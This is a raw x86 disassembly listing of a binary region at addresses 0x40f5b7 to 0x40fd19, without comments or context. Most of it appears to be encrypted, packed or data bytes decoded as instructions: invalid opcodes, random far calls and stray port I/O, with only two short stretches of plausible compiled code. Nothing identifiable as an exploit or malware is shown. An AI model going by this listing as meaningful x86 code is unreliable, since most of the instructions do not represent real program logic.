  40f5b7:	jno    0x40f543
  40f5b9:	xchg   DWORD PTR [ebp-0x59],eax
  40f5bc:	add    al,0x31
  40f5be:	mov    esp,0xbc345e48
  40f5c3:	into   
  40f5c4:	in     eax,0xcd
  40f5c6:	inc    ebp
  40f5c7:	cmp    BYTE PTR [ebp-0x69],dh
  40f5ca:	mov    al,0xf3
  40f5cc:	or     BYTE PTR [edx],bh
  40f5ce:	pushf  
  40f5cf:	inc    bx
  40f5d1:	xchg   esp,eax
  40f5d2:	cs adc edi,ecx
  40f5d5:	mov    WORD PTR [esi+0x11b1a3d9],?
  40f5db:	int3   
  40f5dc:	push   ss
  40f5dd:	(bad)  
  40f5df:	xor    eax,0x2fa7b599
  40f5e4:	push   es
  40f5e5:	xchg   ebx,eax
  40f5e6:	imul   edx,DWORD PTR [ebx+eiz*2+0x64],0x5aaed6f
  40f5ee:	int    0xb9
  40f5f0:	ret    
  40f5f1:	push   ebp
  40f5f2:	jae    0x40f5dc
  40f5f4:	inc    edx
  40f5f5:	nop
  40f5f6:	add    BYTE PTR [esp+ebx*4+0x10382fbc],0xdd
  40f5fe:	jnp    0x40f5c7
  40f600:	and    bl,BYTE PTR [esi+0x37]
  40f603:	mov    al,0x9b
  40f605:	hlt    
  40f606:	mov    ah,BYTE PTR [edi+0x68]
  40f609:	xor    edx,DWORD PTR [esi]
  40f60b:	mov    ecx,0xa4226a1
  40f610:	sar    BYTE PTR [edx-0x7],1
  40f613:	call   0x845f:0xfbc46c64
  40f61a:	dec    eax
  40f61b:	mov    al,BYTE PTR ds:0x1f76ae56
  40f621:	sbb    BYTE PTR [ebx-0x546e58e6],ah
  40f627:	repz ja 0x40f5bf
  40f62a:	inc    esp
  40f62b:	sbb    DWORD PTR [edi],ebx
  40f62d:	shl    DWORD PTR [eax+0x49bdf89e],0xf
  40f634:	and    dh,ch
  40f636:	xor    ecx,esi
  40f638:	jnp    0x40f658
  40f63a:	fadd   st,st(7)
  40f63c:	es xor edi,edx
  40f63f:	adc    eax,0x587db51d
  40f644:	fst    DWORD PTR [edi-0x5]
  40f647:	les    ebp,FWORD PTR [esi+0x6e]
  40f64a:	fdivr  QWORD PTR [eax]
  40f64c:	sahf   
  40f64d:	call   0xa7fb:0xeb8e2252
  40f654:	pushf  
  40f655:	pop    es
  40f656:	adc    eax,0x72476f7b
  40f65b:	aas    
  40f65c:	push   edi
  40f65d:	sub    al,0xc1
  40f65f:	pop    ecx
  40f660:	sub    ecx,eax
  40f662:	mov    eax,DWORD PTR [ebp-0x30]
  40f665:	mov    edx,DWORD PTR [ebp-0x2c]
  40f668:	sub    ecx,eax
  40f66a:	mov    eax,DWORD PTR [ebp+0xc]
  40f66d:	mov    eax,DWORD PTR [eax]
  40f66f:	mov    edi,ecx
  40f671:	shl    edi,0x1e
  40f674:	or     edi,0x40000000
  40f67a:	xor    ecx,ecx
  40f67c:	xor    esi,esi
  40f67e:	inc    eax
  40f67f:	shl    eax,0x1e
  40f682:	add    esi,ecx
  40f684:	adc    edi,eax
  40f686:	jmp    0x40fa04
  40f68b:	pop    ebx
  40f68c:	loopne 0x40f6a0
  40f68e:	out    dx,al
  40f68f:	cwde   
  40f690:	cmp    eax,0xbb5875a7
  40f695:	ins    DWORD PTR es:[edi],dx
  40f696:	inc    ebp
  40f697:	sbb    DWORD PTR [esi],ebp
  40f699:	jmp    0x78bb:0xbb21353b
  40f6a0:	lds    edi,FWORD PTR [ebx-0x79610f45]
  40f6a6:	add    esi,DWORD PTR [ebx-0x67944a7d]
  40f6ac:	mov    ebp,0x9b910882
  40f6b1:	jnp    0x40f6c5
  40f6b3:	mov    bl,0x93
  40f6b5:	add    ebp,DWORD PTR [ebp-0x2d]
  40f6b8:	pop    es
  40f6b9:	gs pop esp
  40f6bb:	fs mov db4,eax
  40f6bf:	bound  ebp,QWORD PTR [ecx+0x21]
  40f6c2:	out    dx,eax
  40f6c3:	aad    0x54
  40f6c5:	aaa    
  40f6c6:	mov    esi,0xad8411f5
  40f6cb:	cmc    
  40f6cc:	ret    0x1803
  40f6cf:	xchg   esi,eax
  40f6d0:	xchg   DWORD PTR [ecx-0x6f47192a],ebx
  40f6d6:	das    
  40f6d7:	inc    esp
  40f6d8:	mov    eax,ds:0xbe303f51
  40f6dd:	iret   
  40f6de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6df:	cli    
  40f6e0:	out    0xd0,eax
  40f6e2:	cmp    DWORD PTR [eax+edi*8],ebp
  40f6e5:	neg    DWORD PTR [edx+0x28]
  40f6e8:	jbe    0x40f73b
  40f6ea:	in     eax,0xa5
  40f6ec:	pop    ecx
  40f6ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6ee:	and    BYTE PTR [esi],ch
  40f6f0:	dec    ebp
  40f6f1:	pushf  
  40f6f2:	and    DWORD PTR [eax+0x70],ebx
  40f6f5:	push   ecx
  40f6f6:	aaa    
  40f6f7:	cmp    edx,DWORD PTR [ebp+0x12]
  40f6fa:	xchg   bl,bh
  40f6fc:	inc    ebx
  40f6fd:	add    DWORD PTR [esi+0x9],ecx
  40f700:	xchg   BYTE PTR [ebx-0x63e78c79],bh
  40f706:	mov    cl,0x54
  40f708:	into   
  40f709:	mov    ah,0x2e
  40f70b:	icebp  
  40f70c:	add    ah,0x2b
  40f70f:	test   DWORD PTR [edx],ebx
  40f711:	(bad)
  40f714:	or     esi,DWORD PTR [edi-0x27275474]
  40f71a:	enter  0x1a11,0xd7
  40f71e:	fwait
  40f71f:	jp     0x40f71e
  40f721:	fadd   QWORD PTR [edi]
  40f723:	xchg   ebx,eax
  40f724:	sub    DWORD PTR [edi],eax
  40f726:	adc    BYTE PTR [esi],ch
  40f728:	mov    DWORD PTR [edx-0x478a1c5],ecx
  40f72e:	jmp    0x40f7a0
  40f730:	scas   eax,DWORD PTR es:[edi]
  40f731:	or     DWORD PTR [edi+0x4829467f],edx
  40f737:	dec    ecx
  40f738:	xchg   esi,eax
  40f739:	(bad)  
  40f73a:	fisttp QWORD PTR [ecx-0x80]
  40f73d:	aam    0xc7
  40f73f:	inc    edx
  40f740:	(bad)  
  40f741:	fsubr  st(7),st
  40f743:	jo     0x40f79e
  40f745:	jp     0x40f79a
  40f747:	fild   QWORD PTR [ecx+0x24]
  40f74a:	iret   
  40f74b:	out    0x90,eax
  40f74d:	outs   dx,BYTE PTR ds:[esi]
  40f74e:	cmp    DWORD PTR [ebx+0x412474a3],esi
  40f754:	mov    ecx,0x99d5689e
  40f759:	in     al,dx
  40f75a:	add    BYTE PTR [ecx-0x7c],dl
  40f75d:	popf   
  40f75e:	xchg   ebx,eax
  40f75f:	xor    esi,DWORD PTR [ecx]
  40f761:	ds int 0x6d
  40f764:	jmp    0x5276f55a
  40f769:	loopne 0x40f7ce
  40f76b:	fs fwait
  40f76d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f76e:	mov    edi,0xff0c522
  40f773:	rol    DWORD PTR ds:0x3ff9427a,cl
  40f779:	cmp    DWORD PTR [eax-0x3d9426e4],ebp
  40f77f:	daa    
  40f780:	out    0xcf,eax
  40f782:	leave  
  40f783:	mov    edx,DWORD PTR ds:0xa67d4bab
  40f789:	(bad)  
  40f78a:	sub    eax,0x90191002
  40f78f:	(bad)  
  40f790:	mov    bl,0x7e
  40f792:	sbb    BYTE PTR [ebx],bl
  40f794:	call   0x18f:0xb55803a7
  40f79b:	cmp    dl,BYTE PTR [eax-0x2f5ba861]
  40f7a1:	xor    al,0x3b
  40f7a3:	push   ecx
  40f7a4:	jmp    0x40f76c
  40f7a6:	into   
  40f7a7:	cli    
  40f7a8:	das    
  40f7a9:	jg     0x40f80a
  40f7ab:	call   0x8d36:0x4e2c84
  40f7b2:	js     0x40f7c5
  40f7b4:	mov    DWORD PTR [ecx+eax*1+0x57],ebp
  40f7b8:	fstp   TBYTE PTR gs:[ecx-0x4fe32b9c]
  40f7bf:	cvttps2pi mm3,xmm6
  40f7c2:	or     ebp,DWORD PTR [edi-0xe]
  40f7c5:	fucomp st(0)
  40f7c7:	sahf   
  40f7c8:	mov    fs,WORD PTR [ebx]
  40f7ca:	(bad)  
  40f7cb:	cld    
  40f7cc:	mov    al,0x38
  40f7ce:	mov    eax,0xdf654375
  40f7d3:	pop    eax
  40f7d4:	gs int3 
  40f7d6:	mov    ah,0xa2
  40f7d8:	scas   eax,DWORD PTR es:[edi]
  40f7d9:	out    0xa3,eax
  40f7db:	out    0xf3,eax
  40f7dd:	pop    esi
  40f7de:	adc    BYTE PTR [edx+0x64c7af5b],dl
  40f7e4:	shl    BYTE PTR [ebp-0x10],1
  40f7e7:	cmp    al,0xe4
  40f7e9:	dec    esp
  40f7ea:	xchg   ebp,eax
  40f7eb:	neg    dl
  40f7ed:	aad    0x21
  40f7ef:	mov    bl,0x1d
  40f7f1:	(bad)  
  40f7f2:	ins    BYTE PTR es:[edi],dx
  40f7f3:	xor    eax,DWORD PTR [edx-0x28]
  40f7f6:	sbb    BYTE PTR [edi],ch
  40f7f8:	mov    esp,0xd8ff134f
  40f7fd:	sub    DWORD PTR [ecx+0x4f],0x1b
  40f801:	push   ecx
  40f802:	pop    ecx
  40f803:	sub    al,0xbb
  40f805:	jns    0x40f796
  40f807:	not    BYTE PTR [edi]
  40f809:	cmp    al,al
  40f80b:	mov    DWORD PTR [eax+0x31f1e1d6],edi
  40f811:	nop
  40f812:	jmp    0x40f7e0
  40f814:	not    BYTE PTR [ebx+0x276c02e9]
  40f81a:	orps   xmm5,xmm5
  40f81d:	cmp    al,0x2c
  40f81f:	cld    
  40f820:	cmp    DWORD PTR [ebp-0x6e97c95f],ecx
  40f826:	fnstenv [esi+0x338d3a0]
  40f82c:	sbb    al,0xf3
  40f82e:	es jmp 0x1685:0x6000989f
  40f836:	xor    eax,0xb8cfbced
  40f83b:	jae    0x40f85a
  40f83d:	stc    
  40f83e:	add    DWORD PTR [edx+0x5455f688],ebp
  40f844:	or     cl,BYTE PTR [edx+edi*2]
  40f847:	retf   
  40f848:	xor    DWORD PTR [ebx],0x33
  40f84b:	dec    edx
  40f84c:	jmp    0x5bbf796f
  40f851:	cmp    BYTE PTR [edx+0x2d],bl
  40f854:	hlt    
  40f855:	outs   dx,BYTE PTR ds:[esi]
  40f856:	inc    ch
  40f858:	mov    ebp,0xbea353f7
  40f85d:	sahf   
  40f85e:	stos   BYTE PTR es:[edi],al
  40f85f:	pop    es
  40f860:	daa    
  40f861:	outs   dx,BYTE PTR ds:[esi]
  40f862:	mov    ss,ebp
  40f864:	jp     0x40f83d
  40f866:	mov    ecx,0x6007a5fe
  40f86b:	in     al,dx
  40f86c:	test   DWORD PTR [edi-0x484bd409],0xdf64341c
  40f876:	xchg   ebp,eax
  40f877:	add    eax,0x2a973c7a
  40f87c:	xor    ebx,edx
  40f87e:	add    ecx,DWORD PTR [esi+ebp*4]
  40f881:	fcomp  DWORD PTR gs:[edx-0x4ca3ef34]
  40f888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f889:	jno    0x40f89c
  40f88b:	mov    esi,0x762e15af
  40f890:	sbb    eax,0xedf7fcdc
  40f895:	add    ebx,edx
  40f897:	inc    ecx
  40f898:	cmp    BYTE PTR [ebp+0x66],ch
  40f89b:	inc    esp
  40f89c:	ja     0x40f8e5
  40f89e:	inc    eax
  40f89f:	adc    bl,BYTE PTR [eax-0x37]
  40f8a2:	or     ebx,edx
  40f8a4:	sbb    al,BYTE PTR [ebx]
  40f8a6:	xor    DWORD PTR [ecx+0x52c9d429],ebp
  40f8ac:	inc    eax
  40f8ad:	cdq    
  40f8ae:	es aaa 
  40f8b0:	fld    QWORD PTR [esi]
  40f8b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8b3:	jae    0x40f902
  40f8b5:	repz mov edx,0x29cf437a
  40f8bb:	push   es
  40f8bc:	sub    ecx,DWORD PTR [ebx+0x71]
  40f8bf:	dec    ebx
  40f8c0:	arpl   sp,bx
  40f8c2:	xchg   BYTE PTR [ecx-0x53],dl
  40f8c5:	inc    ebx
  40f8c6:	(bad)  
  40f8c7:	dec    ebp
  40f8c8:	xor    al,0x57
  40f8ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8cb:	lahf   
  40f8cc:	loopne 0x40f854
  40f8ce:	push   ecx
  40f8cf:	jle    0x40f907
  40f8d1:	cmp    edi,DWORD PTR [ebx-0x5c]
  40f8d4:	mov    dl,BYTE PTR [ebp+0x24]
  40f8d7:	and    DWORD PTR [bx+di],ebx
  40f8da:	popf   
  40f8db:	push   ss
  40f8dc:	and    al,BYTE PTR [ecx]
  40f8de:	jmp    0x40f877
  40f8e0:	inc    edi
  40f8e1:	add    eax,0xf7e42035
  40f8e6:	jge    0x40f944
  40f8e8:	(bad)  
  40f8e9:	mov    ecx,0x1099ea8
  40f8ee:	and    BYTE PTR ds:0xbab506b7,bl
  40f8f4:	mov    edx,0x37d912a2
  40f8f9:	dec    esi
  40f8fa:	xchg   ebp,eax
  40f8fb:	es jle 0x40f910
  40f8fe:	lahf   
  40f8ff:	push   esi
  40f900:	push   ecx
  40f901:	dec    esp
  40f902:	jno    0x40f88d
  40f904:	mov    al,0xc8
  40f906:	mov    dl,0xb
  40f908:	(bad)  
  40f90a:	and    DWORD PTR [eax],esi
  40f90c:	push   ds
  40f90d:	nop
  40f90e:	aad    0xe7
  40f910:	lock and al,0xd5
  40f913:	cmc    
  40f914:	sbb    bl,BYTE PTR [ecx]
  40f916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f917:	sar    DWORD PTR [eax-0x60],0x4a
  40f91b:	stc    
  40f91c:	popa   
  40f91d:	outs   dx,BYTE PTR ds:[esi]
  40f91e:	retf   
  40f91f:	out    dx,al
  40f920:	rcr    DWORD PTR [ecx+0x7c],1
  40f923:	dec    edx
  40f924:	push   esi
  40f925:	ins    DWORD PTR es:[edi],dx
  40f926:	xchg   dh,dl
  40f928:	ins    BYTE PTR es:[edi],dx
  40f929:	dec    ebp
  40f92a:	xchg   ecx,eax
  40f92b:	cmp    dl,BYTE PTR [esi-0x3294f2bd]
  40f931:	pop    es
  40f932:	dec    eax
  40f933:	xor    cl,BYTE PTR [ecx-0x2e]
  40f936:	inc    ebp
  40f937:	call   0xaae8:0x685f595e
  40f93e:	jnp    0x40f8d6
  40f940:	ins    DWORD PTR es:[edi],dx
  40f941:	sti    
  40f942:	mov    ds:0x2818674b,al
  40f947:	ret    0x6157
  40f94a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f94b:	xor    eax,0x9433cd8b
  40f950:	mov    ecx,0x57149da5
  40f955:	pop    es
  40f956:	cwde   
  40f957:	jne    0x40f97d
  40f959:	inc    edx
  40f95a:	and    eax,0x5c6ea89e
  40f95f:	ror    BYTE PTR [ecx+0x7986da13],1
  40f965:	not    BYTE PTR [ecx-0x3071efbc]
  40f96b:	cdq    
  40f96c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f96d:	dec    edi
  40f96e:	jns    0x40f962
  40f970:	lahf   
  40f971:	and    al,0x28
  40f973:	push   0x124a153f
  40f978:	test   ch,al
  40f97a:	scas   eax,DWORD PTR es:[edi]
  40f97b:	cmp    esi,DWORD PTR [edi-0x3e]
  40f97e:	sub    ebx,DWORD PTR fs:[eax-0x51]
  40f982:	pop    esp
  40f983:	xlat   BYTE PTR ds:[ebx]
  40f984:	frstor [eax]
  40f986:	xchg   edx,eax
  40f987:	mov    eax,ds:0xcd113a2
  40f98c:	rcl    BYTE PTR [ebp-0x556f830b],1
  40f992:	scas   eax,DWORD PTR es:[edi]
  40f993:	push   0xffffffca
  40f995:	fdiv   st,st(4)
  40f997:	jp     0x40f9f1
  40f999:	pop    edx
  40f99a:	stos   BYTE PTR es:[edi],al
  40f99b:	int3   
  40f99c:	jle    0x40f96b
  40f99e:	and    BYTE PTR [edx],ah
  40f9a0:	jg     0x40f972
  40f9a2:	jge    0x40f969
  40f9a4:	cld    
  40f9a5:	(bad)  
  40f9a6:	es aam 0x42
  40f9a9:	or     ebx,DWORD PTR [ecx+0x681e50ac]
  40f9af:	push   ecx
  40f9b0:	sub    DWORD PTR es:[edi+0xb],ecx
  40f9b4:	test   eax,0x752a5aab
  40f9b9:	and    BYTE PTR [ebp+0x38],ch
  40f9bc:	retf   
  40f9bd:	in     eax,dx
  40f9be:	sub    DWORD PTR [esi-0x40],edi
  40f9c1:	mov    bh,0x91
  40f9c3:	ds nop
  40f9c5:	cld    
  40f9c6:	or     dh,BYTE PTR [ebx+0x46d57727]
  40f9cc:	dec    ebx
  40f9cd:	jge    0x40f998
  40f9cf:	dec    eax
  40f9d0:	fdivrp st(5),st
  40f9d2:	lahf   
  40f9d3:	mov    DWORD PTR [ebx],edi
  40f9d5:	pop    esi
  40f9d6:	xchg   ecx,eax
  40f9d7:	out    dx,al
  40f9d8:	jns    0x40f9b6
  40f9da:	(bad)  
  40f9db:	(bad)  
  40f9dc:	popf   
  40f9dd:	fnstcw WORD PTR [ebp+0x50]
  40f9e0:	mov    esi,0x6d0ee8a7
  40f9e5:	inc    ebx
  40f9e6:	aaa    
  40f9e7:	es dec eax
  40f9e9:	adc    DWORD PTR [eax],0x3e
  40f9ec:	jnp    0x40fa69
  40f9ee:	push   ds
  40f9ef:	pop    esp
  40f9f0:	or     ch,ah
  40f9f2:	nop
  40f9f3:	outs   dx,DWORD PTR ds:[esi]
  40f9f4:	sbb    al,0x4e
  40f9f6:	xlat   BYTE PTR ds:[ebx]
  40f9f7:	jns    0x40f9d0
  40f9f9:	jmp    0xd511:0xe703130f
  40fa00:	push   ds
  40fa01:	xchg   edi,ebp
  40fa03:	jge    0x40f990
  40fa05:	inc    ebp
  40fa06:	loopne 0x40fa3b
  40fa08:	icebp  
  40fa09:	mov    ecx,DWORD PTR [ebp-0x1c]
  40fa0c:	mov    edx,DWORD PTR [ebp-0x28]
  40fa0f:	mov    ebx,DWORD PTR [ebp-0x24]
  40fa12:	and    eax,edx
  40fa14:	mov    edx,DWORD PTR [ebp-0x30]
  40fa17:	and    ecx,ebx
  40fa19:	mov    ebx,DWORD PTR [ebp-0x2c]
  40fa1c:	push   0x5550
  40fa21:	xor    edi,0x80000000
  40fa27:	add    eax,edx
  40fa29:	push   0x7437
  40fa2e:	adc    ecx,ebx
  40fa30:	push   ecx
  40fa31:	push   eax
  40fa32:	call   0x421ba4
  40fa37:	mov    ecx,eax
  40fa39:	mov    eax,DWORD PTR [ebp+0xc]
  40fa3c:	add    ecx,0x2efa
  40fa42:	adc    edx,0x702e
  40fa48:	or     edx,0x3222
  40fa4e:	or     ecx,0x1af9
  40fa54:	add    ecx,DWORD PTR [eax]
  40fa56:	adc    edx,DWORD PTR [eax+0x4]
  40fa59:	add    ecx,0xd982e005
  40fa5f:	adc    edx,0x9b204d40
  40fa65:	xor    ecx,0xcb89b677
  40fa6b:	xor    edx,0x9d2b8af8
  40fa71:	shrd   ecx,edx,0x2
  40fa75:	or     ecx,esi
  40fa77:	mov    DWORD PTR [ebp-0x30],ecx
  40fa7a:	shr    edx,0x2
  40fa7d:	or     edx,edi
  40fa7f:	mov    DWORD PTR [ebp-0x2c],edx
  40fa82:	mov    eax,ds:0x4225a8
  40fa87:	mov    ecx,DWORD PTR ds:0x4225ac
  40fa8d:	mov    edx,DWORD PTR ds:0x4225a0
  40fa93:	mov    esi,DWORD PTR ds:0x4225a4
  40fa99:	or     ecx,esi
  40fa9b:	or     eax,edx
  40fa9d:	mov    edx,DWORD PTR ds:0x422598
  40faa3:	mov    esi,DWORD PTR ds:0x42259c
  40faa9:	jmp    0x40fe27
  40faae:	mov    ds:0xfdadf4a5,al
  40fab3:	mov    ebp,0xfb67a5b3
  40fab8:	jno    0x40fb2b
  40faba:	loopne 0x40fa91
  40fabc:	out    dx,eax
  40fabd:	cmp    ebp,ebx
  40fabf:	sub    DWORD PTR [ebx-0x443a8745],edi
  40fac5:	mov    ebx,0x3962791
  40faca:	ins    BYTE PTR es:[edi],dx
  40facb:	adc    BYTE PTR [edx+0xd],cl
  40face:	cwde   
  40facf:	xchg   BYTE PTR [ebp-0x1564aa39],cl
  40fad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fad6:	imul   edi,DWORD PTR [ebx-0x22],0xffffff99
  40fada:	inc    ebx
  40fadb:	pop    edx
  40fadc:	cmp    al,0xda
  40fade:	pop    ds
  40fadf:	jno    0x40fae5
  40fae1:	aad    0x1e
  40fae3:	in     al,0x9b
  40fae5:	fcomp  QWORD PTR ss:[eax-0x65ef23a8]
  40faec:	repnz outs dx,DWORD PTR ds:[esi]
  40faee:	xor    al,BYTE PTR [ebx]
  40faf0:	jbe    0x40fb6a
  40faf2:	loope  0x40fa9a
  40faf4:	jl     0x40fa7a
  40faf6:	hlt    
  40faf7:	push   cs
  40faf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faf9:	rep outs dx,DWORD PTR ds:[esi]
  40fafb:	xchg   ebp,eax
  40fafc:	mov    eax,ds:0x8daaf192
  40fb01:	fmul   DWORD PTR [ebx+edi*2-0x19903580]
  40fb08:	ja     0x40fb43
  40fb0a:	ds sahf 
  40fb0c:	fdiv   DWORD PTR [edx-0x7e]
  40fb0f:	and    DWORD PTR [ebx+0xd005ee8],esp
  40fb15:	cmp    BYTE PTR [ecx+0x30],dh
  40fb18:	push   ss
  40fb19:	shl    BYTE PTR [ecx+0x2],cl
  40fb1c:	loopne 0x40fad2
  40fb1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb1f:	fist   DWORD PTR [ebx+0x44513f28]
  40fb25:	dec    edx
  40fb26:	cwde   
  40fb27:	jnp    0x40fb40
  40fb29:	adc    al,0x93
  40fb2b:	cli    
  40fb2c:	cmp    ch,cl
  40fb2e:	lods   al,BYTE PTR ds:[esi]
  40fb2f:	ficom  WORD PTR [esi-0x1b]
  40fb32:	mov    cl,0x1f
  40fb34:	push   ds
  40fb35:	dec    edi
  40fb36:	mov    eax,0x488b2bd6
  40fb3b:	cmp    al,0x5f
  40fb3d:	jge    0x40fba7
  40fb3f:	fcom   QWORD PTR [edx]
  40fb41:	jp     0x40fb79
  40fb43:	adc    dl,BYTE PTR [edi-0x63]
  40fb46:	mov    al,BYTE PTR [ecx]
  40fb48:	fisubr DWORD PTR [ebx]
  40fb4a:	xchg   esi,eax
  40fb4b:	outs   dx,BYTE PTR ds:[esi]
  40fb4c:	sti    
  40fb4d:	les    esp,FWORD PTR [ebp+0x509e876e]
  40fb53:	in     eax,0x2c
  40fb55:	and    esp,DWORD PTR [ebp-0x4a89144d]
  40fb5b:	inc    esi
  40fb5c:	mov    cs,WORD PTR [edi+ebp*8+0x6e05d393]
  40fb63:	adc    ebp,DWORD PTR [edx+ecx*1+0x4b]
  40fb67:	push   cs
  40fb68:	jbe    0x40fb8d
  40fb6a:	je     0x40fb33
  40fb6c:	sbb    esp,edx
  40fb6e:	aas    
  40fb6f:	mov    dh,0x6b
  40fb71:	mov    ds:0xe066d48c,eax
  40fb76:	inc    ecx
  40fb77:	cmp    esp,esp
  40fb79:	neg    BYTE PTR [ebp-0x553b7169]
  40fb7f:	das    
  40fb80:	sbb    ecx,0xe
  40fb83:	data16 fsub QWORD PTR [eax-0x13b50fc1]
  40fb8a:	pop    ebp
  40fb8b:	scas   eax,DWORD PTR es:[edi]
  40fb8c:	leave  
  40fb8d:	dec    ebx
  40fb8e:	xor    al,0x71
  40fb90:	cmp    eax,0x25b294a2
  40fb95:	lea    ebx,[ecx+eax*4+0x7918d466]
  40fb9c:	jle    0x40fb70
  40fb9e:	loopne 0x40fb80
  40fba0:	sbb    ebx,esi
  40fba2:	mov    cl,0x33
  40fba4:	push   esi
  40fba5:	xor    ebx,DWORD PTR [edi]
  40fba7:	test   eax,0xe3518e4e
  40fbac:	cwde   
  40fbad:	and    DWORD PTR es:[eax],esp
  40fbb0:	js     0x40fbfd
  40fbb2:	jmp    0x40fbe4
  40fbb4:	fadd   QWORD PTR [ecx-0x9e39a3c]
  40fbba:	iret   
  40fbbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbbc:	dec    esp
  40fbbd:	push   ecx
  40fbbe:	aaa    
  40fbbf:	mov    eax,0x6cf8df85
  40fbc4:	add    al,0xeb
  40fbc6:	xchg   ebp,eax
  40fbc7:	test   BYTE PTR [esi+0x20],bh
  40fbca:	(bad)  
  40fbcb:	in     eax,0x8f
  40fbcd:	jno    0x40fbc0
  40fbcf:	dec    esi
  40fbd0:	cmp    ecx,DWORD PTR [esi+0x654c298d]
  40fbd6:	jno    0x40fbaf
  40fbd8:	stc    
  40fbd9:	mov    esp,0xae36958
  40fbde:	inc    eax
  40fbdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbe0:	jle    0x40fbc5
  40fbe2:	push   cs
  40fbe3:	cmc    
  40fbe4:	int    0x94
  40fbe6:	adc    eax,0x379c7098
  40fbeb:	xchg   esp,eax
  40fbec:	or     al,0xfd
  40fbee:	mov    BYTE PTR [ecx+ebx*8+0x2],bh
  40fbf2:	and    bl,BYTE PTR [ebp-0x20]
  40fbf5:	es jge 0x40fc0a
  40fbf8:	mov    ds:0x554d5ccf,eax
  40fbfd:	jl     0x40fbfb
  40fbff:	das    
  40fc00:	add    al,0x7f
  40fc02:	push   esi
  40fc03:	popf   
  40fc04:	ds leave 
  40fc06:	sahf   
  40fc07:	jo     0x40fbef
  40fc09:	sub    BYTE PTR [esi+0x7cb337b4],ch
  40fc0f:	je     0x40fc21
  40fc11:	pop    es
  40fc12:	sub    ch,BYTE PTR [esi+0x3c]
  40fc15:	cmp    ebp,DWORD PTR [esi+eax*4-0xd]
  40fc19:	cli    
  40fc1a:	inc    ecx
  40fc1b:	sar    BYTE PTR [esi+esi*4+0x7f],cl
  40fc1f:	test   BYTE PTR [ebp-0x5ede269b],bl
  40fc25:	int3   
  40fc26:	repz inc ecx
  40fc28:	pop    ebx
  40fc29:	push   eax
  40fc2a:	out    0x49,al
  40fc2c:	xlat   BYTE PTR ds:[ebx]
  40fc2d:	ficomp WORD PTR [ecx-0x2a309f58]
  40fc33:	fdivr  DWORD PTR [ebx+0xd3d86aa]
  40fc39:	ficom  WORD PTR [eax]
  40fc3b:	jae    0x40fbeb
  40fc3d:	xor    eax,0x5413d2e8
  40fc42:	mov    bh,0xdd
  40fc44:	addr16 jo 0x40fc25
  40fc47:	and    cl,BYTE PTR [ecx+ebp*8+0xc]
  40fc4b:	stc    
  40fc4c:	pusha  
  40fc4d:	rcr    BYTE PTR [edi+0x1f],1
  40fc50:	int3   
  40fc51:	mov    dh,0x58
  40fc53:	pop    eax
  40fc54:	shl    BYTE PTR [ecx+0x25d398e3],0x66
  40fc5b:	xor    DWORD PTR [ebp+0x35],edi
  40fc5e:	xor    ah,BYTE PTR [ebp+0x2]
  40fc61:	add    al,0x27
  40fc63:	out    dx,eax
  40fc64:	cdq    
  40fc65:	mov    esp,0x3c91ad45
  40fc6a:	mov    ch,0x5e
  40fc6c:	sbb    BYTE PTR [edx],dh
  40fc6e:	pop    ss
  40fc6f:	mov    al,ds:0x81de286
  40fc74:	call   0x99d0883d
  40fc79:	mov    esi,0x80d1edb0
  40fc7e:	inc    eax
  40fc7f:	cs cmp eax,0x62cba17f
  40fc85:	ins    BYTE PTR es:[edi],dx
  40fc86:	sbb    BYTE PTR [edi],bh
  40fc88:	sub    dh,BYTE PTR [esi]
  40fc8a:	xchg   edx,eax
  40fc8b:	push   es
  40fc8c:	dec    ebx
  40fc8d:	rcl    BYTE PTR [eax-0x35],cl
  40fc90:	sub    dl,BYTE PTR [ebx+0x6a]
  40fc93:	(bad)  
  40fc94:	cmp    BYTE PTR [edi+0x2a],bh
  40fc97:	js     0x40fcd8
  40fc99:	fdivr  QWORD PTR [eax+0x20]
  40fc9c:	cmp    al,0x93
  40fc9e:	inc    ebx
  40fc9f:	stc    
  40fca0:	jecxz  0x40fc33
  40fca2:	and    eax,DWORD PTR [ebp-0x3]
  40fca5:	dec    ebx
  40fca6:	aaa    
  40fca7:	bnd call 0xfd1e4741
  40fcad:	ds mov esp,0x8bbd28d1
  40fcb3:	push   ebp
  40fcb4:	jns    0x40fc7b
  40fcb6:	nop    DWORD PTR [ecx+0x2c]
  40fcba:	fmul   DWORD PTR [ebp+0x60d1cfb7]
  40fcc0:	dec    esi
  40fcc1:	jl     0x40fd32
  40fcc3:	xchg   esp,eax
  40fcc4:	push   edx
  40fcc5:	and    dl,dl
  40fcc7:	aam    0x76
  40fcc9:	scas   al,BYTE PTR es:[edi]
  40fcca:	add    eax,0xf53b981b
  40fccf:	outs   dx,BYTE PTR ds:[esi]
  40fcd0:	call   0x2c64:0xcbeef802
  40fcd7:	inc    esp
  40fcd8:	int    0xb0
  40fcda:	aam    0xea
  40fcdc:	jno    0x40fc89
  40fcde:	mov    ebx,0x6a259704
  40fce3:	sub    al,0xaa
  40fce5:	pushf  
  40fce6:	jae    0x40fd25
  40fce8:	aam    0x88
  40fcea:	push   esi
  40fceb:	sbb    al,0xf2
  40fced:	add    dh,BYTE PTR [ebx-0x31]
  40fcf0:	or     eax,ecx
  40fcf2:	mov    edx,0x9b61cc82
  40fcf7:	mov    ebp,0x10850a1c
  40fcfc:	jno    0x40fc89
  40fcfe:	mov    eax,ds:0xc35904a8
  40fd03:	push   eax
  40fd04:	xor    esp,DWORD PTR [eax+0x270d2d45]
  40fd0a:	in     al,dx
  40fd0b:	mov    al,0x92
  40fd0d:	mov    eax,ds:0x3d32f98c
  40fd12:	push   0x8e29ab51
  40fd17:	je     0x40fd2c
  40fd19:	imul   edx
